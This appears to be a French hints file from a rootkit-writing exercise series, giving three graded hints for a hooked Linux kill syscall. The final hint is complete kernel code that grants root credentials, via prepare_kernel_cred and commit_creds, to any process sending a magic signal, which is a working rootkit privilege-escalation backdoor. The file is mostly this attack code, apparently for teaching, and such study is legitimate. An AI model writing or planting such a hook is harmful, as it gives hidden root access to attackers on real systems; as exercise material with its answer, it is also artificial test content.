# Hints, exercice 037

## Niveau 1

Extrais le signal depuis regs->si. Compare avec MAGIC_SIG.
Si match, fais l'escalation (prepare_kernel_cred + commit_creds).
Sinon, passe a l'original.

## Niveau 2

```c
int sig = (int)regs->si;
if (sig == MAGIC_SIG) {
    // escalation
    // retourne 0
}
return orig_kill(regs);
```

## Niveau 3

```c
int sig = (int)regs->si;

if (sig == MAGIC_SIG) {
    struct cred *new_cred;

    pr_info("rootkitlings/037: magic signal from pid %d (%s)\n",
            current->pid, current->comm);

    new_cred = prepare_kernel_cred(NULL);
    if (new_cred)
        commit_creds(new_cred);

    return 0;
}

return orig_kill(regs);
```
